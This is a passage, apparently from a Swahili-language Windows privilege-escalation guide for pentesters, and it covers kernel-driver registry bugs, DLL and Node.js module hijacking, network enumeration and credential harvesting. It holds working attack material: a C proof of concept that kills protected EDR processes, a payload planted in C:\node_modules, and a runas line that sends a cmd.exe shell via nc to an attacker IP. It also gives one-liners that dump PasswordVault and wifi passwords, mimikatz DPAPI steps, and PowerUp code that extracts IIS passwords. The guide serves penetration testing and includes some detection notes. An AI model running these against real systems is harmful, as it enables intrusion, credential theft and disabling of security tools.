Hii hutengeneza primitives mbili zinazoweza kutumika:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: path kamili ya `\Registry\...` inayodhibitiwa na mtumiaji huiwezesha driver kuuliza keys zilizochaguliwa na mshambuliaji, kufichua kuwepo kwake kupitia return codes/logs, na wakati mwingine kusoma values ambazo caller hangeweza kuzifikia moja kwa moja.
- **Kernel memory corruption**: destination ya scalar kama `&readValue` hutafsiriwa kimakosa kama `REG_QWORD`, `UNICODE_STRING`, au buffer ya binary yenye ukubwa maalum, kutegemea aina ya registry value.

Vidokezo vya practical exploitation:

- **Windows 8+ mitigation**: ikiwa query inalenga **untrusted hive** kwa `RTL_QUERY_REGISTRY_DIRECT` lakini bila `RTL_QUERY_REGISTRY_TYPECHECK`, callers wa kernel huanguka kwa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Ili exploitability ibaki, tafuta **keys zinazoweza kuandikwa na mshambuliaji ndani ya trusted system hives** badala ya kuweka values chini ya `HKCU`.
- **Trusted-hive staging**: tumia NtObjectManager kuorodhesha descendants zinazoweza kuandikwa chini ya `\Registry\Machine`, kisha rudia uchanganuzi huo kwa token ya **low-integrity** iliyorudiwa ili kupata keys zinazofikika kutoka kwenye mazingira ya sandbox:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direct write ya baiti 8 ndani ya `int` ya baiti 4 huharibu data za karibu kwenye stack na inaweza kuandika sehemu tu ya callback/function pointer iliyo karibu.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode hutegemea `EntryContext` kuelekeza kwenye `UNICODE_STRING`. Ikiwa msimbo kwanza unapakia `REG_DWORD` inayodhibitiwa na mshambulizi kwenye scalar ya stack, kisha unatumia tena buffer hiyo hiyo kwa usomaji wa string, mshambulizi hudhibiti `Length`/`MaximumLength` na huathiri kwa sehemu pointer ya `Buffer`, hivyo kusababisha kernel write inayodhibitiwa kwa kiasi.
- **`REG_BINARY`**: kwa data kubwa ya binary, direct mode huchukulia `LONG` ya kwanza kwenye `EntryContext` kuwa ukubwa wa buffer wenye alama ya sign. Ikiwa usomaji wa awali wa `REG_DWORD` utaacha thamani **hasi** inayodhibitiwa na mshambulizi kwenye scalar inayotumiwa tena, query inayofuata ya `REG_BINARY` hunakili baiti za mshambulizi moja kwa moja juu ya nafasi za stack zilizo karibu. Hii mara nyingi ndiyo njia rahisi zaidi ya kuandika upya callback pointer nzima.

Muundo thabiti wa kutafuta: **usomaji wa registry wa aina tofauti unaotumia variable ileile ya stack bila kuianzisha upya**. Tafuta `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, pointer za `EntryContext` zinazotumiwa tena, na njia za msimbo ambako usomaji wa kwanza wa registry huamua ikiwa usomaji wa pili utafanyika.

#### Kutumia vibaya kukosekana kwa FILE_DEVICE_SECURE_OPEN kwenye device objects (LPE + EDR kill)

Baadhi ya third-party drivers zilizosainiwa huunda device object yao kwa SDDL imara kupitia IoCreateDeviceSecure, lakini husahau kuweka FILE_DEVICE_SECURE_OPEN katika DeviceCharacteristics. Bila flag hii, DACL salama haitumiki kifaa kinapofunguliwa kupitia path iliyo na sehemu ya ziada, hivyo mtumiaji yeyote asiye na mamlaka anaweza kupata handle kwa kutumia namespace path kama:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwenye tukio halisi)

Mtumiaji akishaweza kufungua kifaa, IOCTLs zenye mamlaka ya juu zinazotolewa na driver zinaweza kutumiwa vibaya kwa LPE na kufanya tampering. Uwezo ulioshuhudiwa katika mazingira halisi ni pamoja na:
- Kurejesha handles zenye ufikiaji kamili kwa processes zozote (wizi wa token / shell ya SYSTEM kupitia DuplicateTokenEx/CreateProcessAsUser).
- Kusoma/kuandika raw disk bila vizuizi (tampering nje ya mfumo, mbinu za persistence wakati wa boot).
- Kusitisha processes zozote, ikiwemo Protected Process/Light (PP/PPL), na hivyo kuruhusu AV/EDR kill kutoka user land kupitia kernel.

Muundo wa chini kabisa wa PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations kwa developers
- Weka FILE_DEVICE_SECURE_OPEN kila wakati unapounda device objects zinazokusudiwa kuzuiwa kwa DACL.
- Thibitisha muktadha wa caller kwa shughuli zenye privileges. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu kusitishwa kwa process au kurejeshwa kwa handles.
- Weka vikwazo kwa IOCTLs (access masks, METHOD_*, uthibitishaji wa input) na ufikirie kutumia mifumo ya broker badala ya privileges za kernel za moja kwa moja.

Mawazo ya detection kwa defenders
- Fuatilia ufunguzi kutoka user-mode wa majina ya device yanayotiliwa shaka (kwa mfano, \\ .\\amsdk*) na mfuatano mahususi wa IOCTL unaoashiria matumizi mabaya.
- Tekeleza blocklist ya Microsoft ya vulnerable drivers (HVCI/WDAC/Smart App Control) na udumishe allow/deny lists zako mwenyewe.


## PATH DLL Hijacking

Ukiwa na **ruhusa za kuandika ndani ya folder iliyo kwenye PATH**, unaweza kuweza kufanya hijack ya DLL inayopakiwa na process na **kuongeza privileges**.<sup>[[2]](#references)</sup>

Kagua ruhusa za folders zote zilizo ndani ya PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Utekaji wa module resolution wa Node.js / Electron kupitia `C:\node_modules`

Hii ni aina ya **Windows uncontrolled search path** inayoathiri programu za **Node.js** na **Electron** zinapotumia import isiyo na njia kamili, kama vile `require("foo")`, na module inayotarajiwa **haipo**.<sup>[[20]](#references)</sup>

Node hutafuta packages kwa kupanda kwenye mti wa saraka na kuangalia folda za `node_modules` kwenye kila saraka ya mzazi. Kwenye Windows, utafutaji huo unaweza kufika kwenye mzizi wa drive, kwa hivyo programu iliyoanzishwa kutoka `C:\Users\Administrator\project\app.js` inaweza kujaribu kutafuta hapa:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **mtumiaji mwenye marupurupu ya chini** anaweza kuunda `C:\node_modules`, anaweza kupandikiza `foo.js` hasidi (au folda ya package) na kusubiri **mchakato wa Node/Electron wenye marupurupu ya juu** ujaribu kutafuta dependency inayokosekana. Payload hutekelezwa katika muktadha wa usalama wa mchakato wa mwathiriwa, kwa hivyo hali hii huwa **LPE** wakati wowote lengo linapoendeshwa kama administrator, kupitia scheduled task/service wrapper iliyopewa marupurupu ya juu, au na programu ya desktop yenye marupurupu inayojiwasha yenyewe.

Hili hutokea mara nyingi hasa wakati:

- dependency imetajwa kwenye `optionalDependencies`<sup>[[22]](#references)</sup>
- library ya mtu mwingine inaweka `require("foo")` ndani ya `try/catch` na inaendelea ikiwa imeshindwa
- package iliondolewa kwenye builds za production, ikaachwa wakati wa packaging, au ikashindwa kusakinishwa
- `require()` iliyo hatarini iko ndani kabisa ya mti wa dependencies badala ya kuwa kwenye code kuu ya programu

### Kutafuta malengo yaliyo hatarini

Tumia **Procmon** kuthibitisha njia ya utatuzi:<sup>[[23]](#references)</sup>

- Chuja kwa `Process Name` = executable inayolengwa (`node.exe`, EXE ya programu ya Electron, au mchakato wa wrapper)
- Chuja kwa `Path` `contains` `node_modules`
- Lenga `NAME NOT FOUND` na jaribio la mwisho la kufungua lililofanikiwa chini ya `C:\node_modules`

Mifumo ya code-review inayofaa kutafuta kwenye faili za `.asar` zilizofunguliwa au chanzo cha programu:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Tambua **jina la package inayokosekana** kupitia Procmon au ukaguzi wa source.
2. Unda directory ya root lookup ikiwa bado haipo:

```powershell
mkdir C:\node_modules
```

3. Weka module yenye jina halisi linalotarajiwa:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Washa programu ya mwathiriwa. Ikiwa programu itajaribu `require("foo")` na moduli halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano ya hali halisi ya moduli za hiari zinazokosekana zinazolingana na muundo huu ni pamoja na `bluebird` na `utf-8-validate`, lakini **mbinu** ndiyo sehemu inayoweza kutumika tena: tafuta **bare import** yoyote inayokosekana ambayo mchakato wa Windows Node/Electron wenye upendeleo utasuluhisha.

### Mawazo ya ugunduzi na uimarishaji wa usalama

- Toa arifa mtumiaji anapounda `C:\node_modules` au kuandika faili/pakiti mpya za `.js` humo.
- Tafuta michakato yenye uadilifu wa juu inayosoma kutoka `C:\node_modules\*`.
- Jumuisha dependencies zote za runtime katika production na kagua matumizi ya `optionalDependencies`.
- Kagua code ya wahusika wengine ili kubaini mifumo ya kimya ya `try { require("...") } catch {}`.
- Zima ukaguzi wa hiari ikiwa library inaunga mkono hilo (kwa mfano, baadhi ya deployments za `ws` zinaweza kuepuka ukaguzi wa zamani wa `utf-8-validate` kwa kutumia `WS_NO_UTF_8_VALIDATE=1`).

## Mtandao

### Shares

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts file

Angalia kompyuta nyingine zinazojulikana zilizowekwa moja kwa moja kwenye hosts file.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Violesura vya Mtandao na DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Bandari Zilizofunguliwa

Kagua **huduma zilizozuiliwa** kutoka nje

```bash
netstat -ano #Opened ports?
```

Kwa listener ya ndani, linganisha PID yake na mmiliki wa process, njia ya executable, na service au scheduled task yoyote inayoianzisha. Remote-control service inaweza kutoa ufikiaji kama mtumiaji wa desktop yake ikiwa tu uthibitishaji na vidhibiti vya amri vinaruhusu. Custom TCP application inayoendeshwa na akaunti yenye marupurupu ya juu ni lengo tofauti la ukaguzi: listener na njia ya binary ni vidokezo vya awali tu, ilhali njia ya memory-corruption iliyothibitishwa inahitaji uchanganuzi wa binary hiyo mahususi na input inayoweza kuifikia. Ikiwa port iliyo wazi inaonekana kuwa ya system process, ilinganishe na [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) kabla ya kubainisha backend service; forwarding rule pekee haithibitishi kwamba destination inaweza kufikiwa au ina udhaifu.

### Jedwali la Uelekezaji

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Jedwali la ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Kanuni za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha kanuni, unda kanuni, zima, zima...)**

[Amri zaidi za network enumeration hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` inaweza pia kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata mtumiaji wa root, unaweza kusikiliza kwenye port yoyote (unapotumia `nc.exe` kwa mara ya kwanza kusikiliza kwenye port, GUI itakuuliza ikiwa `nc` iruhusiwe na firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Ili kuanzisha bash kwa urahisi kama root, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` kwenye folda ya `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Kuwa `root` wa Linux ndani ya WSL pekee hakukupi haki za Windows Administrator. Ikiwa utambulisho wa sasa wa Windows unaweza kusoma mfumo wa faili wa distro, kagua faili za historia ya shell (ikiwemo `/root/.bash_history`) ili kutafuta amri ambazo huenda zilirekodi credentials; kupata ruhusa za juu bado kunahitaji akaunti halali yenye ruhusa za juu na njia ya uthibitishaji inayoruhusiwa. Muundo wa `LocalState\rootfs` unatumika kwa usakinishaji wa zamani wa WSL; WSL 2 kwa kawaida huhifadhi distro kwenye diski pepe ya [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), kwa hiyo tambua kwanza distro husika na mahali ilipohifadhiwa. Epuka kuchapisha maudhui ya historia wakati wa uchunguzi wa kiotomatiki.

## Vitambulisho vya Windows

### Vitambulisho vya Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Chukulia `DefaultUserName` na `DefaultDomainName` kama muktadha wa akaunti, si credentials. Thamani isiyo tupu ya `DefaultPassword` au `AltDefaultPassword` ni ugunduzi wa nenosiri la maandishi wazi kwenye registry. Ikiwa `AutoAdminLogon=1` lakini hakuna nenosiri la maandishi wazi linaloweza kusomeka, hilo ni dokezo tu: [Sysinternals Autologon inaweza kuhifadhi nenosiri kama LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), na usomaji wa kawaida wa registry hauwezi kuthibitisha kama secret hiyo ipo au inaweza kurejeshwa. Kagua haki za ufikiaji na usanidi halisi wa logon kabla ya kuripoti kufichuliwa kwa credential.

### Kidhibiti cha credentials / Windows vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault huhifadhi credentials za watumiaji za seva, tovuti na programu nyingine ambazo **Windows** inaweza kutumia **kuingia kwa watumiaji kiotomatiki**. Mwanzoni, huenda ikaonekana kana kwamba watumiaji wanaweza kuhifadhi credentials za tovuti kama Facebook, Twitter au Gmail na vivinjari viingie kiotomatiki, lakini sivyo inavyofanya kazi.

Windows Vault huhifadhi credentials ambazo Windows inaweza kutumia kuwaingiza watumiaji kiotomatiki, kumaanisha kwamba **programu yoyote ya Windows inayohitaji credentials ili kufikia rasilimali** (seva au tovuti) **inaweza kutumia Credential Manager** na Windows Vault na kutumia credentials zilizotolewa badala ya watumiaji kuingiza jina la mtumiaji na nenosiri kila mara.

Isipokuwa programu ziwasiliane na Credential Manager, sidhani kama zinaweza kutumia credentials za rasilimali husika. Kwa hiyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba credentials za rasilimali hiyo** kutoka kwenye vault ya hifadhi chaguomsingi.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Kisha unaweza kutumia `runas` pamoja na chaguo la `/savecred` ili kutumia credentials zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Kutumia `runas` na seti ya taarifa za uthibitishaji zilizotolewa.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Kumbuka kuwa mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kupitia [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Programu za kisasa za Windows UWP, Microsoft Edge, na huduma za kisasa za mfumo huhifadhi tokeni za uthibitishaji na manenosiri ya maandishi wazi ndani ya `PasswordVault` ya Universal Windows Platform (UWP) (inayoonekana pia kama `Web Credentials` katika `vaultcmd`). Nafasi hii ya hifadhi imetengwa kwa kila session na inaweza kusimbuliwa kwa njia asilia bila haki za kiutawala au `SeDebugPrivilege`.

Tekeleza amri hii ya PowerShell ndani ya session amilifu ya mtumiaji ili kutoa na kusimbua mara moja majina yote ya watumiaji yaliyohifadhiwa pamoja na manenosiri yao ya maandishi wazi:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** hutoa mbinu ya usimbaji fiche linganifu wa data, inayotumiwa hasa ndani ya mfumo wa uendeshaji wa Windows kwa usimbaji fiche linganifu wa funguo binafsi zisizolingana. Usimbaji fiche huu hutumia siri ya mtumiaji au mfumo ili kuongeza kwa kiasi kikubwa entropy.

**DPAPI huwezesha usimbaji fiche wa funguo kwa kutumia ufunguo linganifu unaotokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha usimbaji fiche wa mfumo, hutumia siri za uthibitishaji wa kikoa za mfumo.

Funguo za RSA za mtumiaji zilizosimbwa fiche kwa kutumia DPAPI huhifadhiwa katika saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Kitambulisho cha Usalama](https://en.wikipedia.org/wiki/Security_Identifier) cha mtumiaji. **Ufunguo wa DPAPI, uliohifadhiwa pamoja na ufunguo mkuu unaolinda funguo binafsi za mtumiaji katika faili hiyo hiyo**, kwa kawaida huwa na baiti 64 za data nasibu. (Ni muhimu kutambua kwamba ufikiaji wa saraka hii umezuiwa, hivyo haiwezekani kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD, ingawa yanaweza kuorodheshwa kupitia PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Unaweza kutumia **mimikatz module** `dpapi::masterkey` pamoja na hoja zinazofaa (`/pvk` au `/rpc`) ili kuifungua.

**Faili za credentials zinazolindwa na nenosiri kuu** kwa kawaida hupatikana katika:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili kusimbua.\
Unaweza **kutoa DPAPI** **masterkeys** nyingi kutoka kwenye **memory** kwa kutumia module ya `sekurlsa::dpapi` (ikiwa una root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credentials za PowerShell

**Credentials za PowerShell** hutumiwa mara nyingi kwa **scripting** na kazi za automation kama njia rahisi ya kuhifadhi credentials zilizosimbwa. Credentials hulindwa kwa kutumia **DPAPI**, ambayo kwa kawaida humaanisha zinaweza kusimbuliwa na mtumiaji yuleyule kwenye kompyuta ileile zilipoundwa pekee.

Credential iliyohamishwa inaweza kuwa na jina lolote la faili au njia ya `.xml`. Script au orodha ya faili ikielekeza kwenye moja, tafuta saraka halisi ya wasifu wa akaunti badala ya kudhani kuwa ni `C:\Users`: [Windows inaweza kuweka wasifu mahali pengine](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Faili inayosomeka ni kidokezo tu; [Windows `Export-Clixml` hufungamanisha credential iliyosimbwa na mtumiaji na kompyuta iliyoi-export](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), na akaunti yoyote iliyopatikana lazima pia iwe na ruhusa halali kwenye huduma inayokusudiwa. Kagua njia na ACL kwanza, bila kuonyesha thamani zilizosimbwa au maandishi ya wazi wakati wa ukaguzi wa kawaida.

Ili **kusimbua** credentials za PS kutoka kwenye faili inayozihifadhi, unaweza kufanya hivi:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na kwenye `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri Zilizotekelezwa Hivi Karibuni

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Kidhibiti cha Vitambulisho vya Remote Desktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Tumia module ya **Mimikatz** `dpapi::rdg` pamoja na `/masterkey` inayofaa ili **kusimbua faili zozote za .rdg**\
Unaweza **kutoa DPAPI masterkeys nyingi** kutoka kwenye memory kwa kutumia module ya Mimikatz `sekurlsa::dpapi`

**mRemoteNG hutumia hifadhi tofauti ya connection.** Kagua XML inayosomeka chini ya `%APPDATA%\mRemoteNG` na Documents za mtumiaji, ikijumuisha faili zenye majina ya kawaida kama `config.xml`. Tambua schema ya connection na attributes za `Password` zilizosimbwa kabla ya kuchukulia faili ya XML kuwa kidokezo cha credential. Thamani iliyohifadhiwa si password ya DPAPI/RDCMan; urejeshaji hutegemea mipangilio ya usimbaji ya faili na kama custom master password ilitumika. Epuka kuchapisha thamani zilizosimbwa wakati wa enumeration pana.

**Profile exports za Remote Desktop Plus** zinaweza pia kusomeka kwenye directories za watumiaji au folda ya usimamizi inayoshirikiwa. Export ya zamani ya `profiles.xml` ina entries za `Data/Profile` zenye elementi za `ProfileName`, `Password`, na `Secure`. Chukulia elementi ya password isiyo tupu kama kidokezo cha credential, bila kuichapisha au kudhani kuwa iko wazi: [maelezo ya mtengenezaji](https://www.donkz.nl/) yanasema kuwa ulinzi wa profile unaweza kufungwa kwenye akaunti na kompyuta iliyoiunda, au kusanidiwa kwa masharti yasiyo makali sana. Thibitisha chanzo cha faili na masharti ya urejeshaji kabla ya kuitumia.

### Sticky Notes

Watu mara nyingi hutumia app ya Sticky Notes kwenye workstations za Windows **kuhifadhi passwords** na taarifa nyingine, bila kutambua kuwa ni faili ya database. Faili hii hupatikana kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na daima inafaa kuitafuta na kuikagua.

Watu wakati mwingine huhifadhi passwords na taarifa nyingine kwenye programu za sticky-note. App ya Sticky Notes iliyopakiwa na Microsoft kwa kawaida huhifadhi notes kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; apps za zamani au tofauti zinaweza kutumia hifadhi nyingine za user-profile, ikijumuisha LevelDB. Tambua app iliyosakinishwa na format ya hifadhi kabla ya kuchukulia kukosekana kwa faili ya SQLite kuwa hakuna notes.

Ikiwa Sticky Notes inatumia SQLite write-ahead logging, nakala ya `plum.sqlite` pekee inaweza kukosa notes za hivi karibuni zilizothibitishwa. Hifadhi `plum.sqlite-wal` inayolingana pamoja na nakala thabiti ya database, na ujumuishe `plum.sqlite-shm` ikiwa inapatikana; index ya shared-memory inaweza kujengwa upya, lakini WAL ni sehemu ya hali endelevu ya database. Angalia [hati za SQLite kuhusu WAL](https://www.sqlite.org/wal.html). Note yenye jina la akaunti au password ni kidokezo cha credential tu: thibitisha akaunti, ruhusa za ufikiaji, na matumizi ya password hiyo tena kivyake. Rekodi iliyosimbwa ya password-manager pia inahitaji ufunguo wake halisi wa kusimbua na tafsiri mahususi ya programu kabla ya kuthibitisha login yenye privileges za juu zaidi.

### AppCmd.exe

**Kumbuka kuwa ili kurejesha passwords kutoka AppCmd.exe, lazima uwe Administrator na uendeshe kwa kiwango cha High Integrity.**\
**AppCmd.exe** iko kwenye directory ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hii ipo, inawezekana baadhi ya **credentials** zimesanidiwa na zinaweza **kurejeshwa**.

Code hii ilitolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
Installers **huendeshwa kwa SYSTEM privileges**, wengi wako hatarini kwa **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Files and Registry (Credentials)

### Support-tool registry credential artifacts

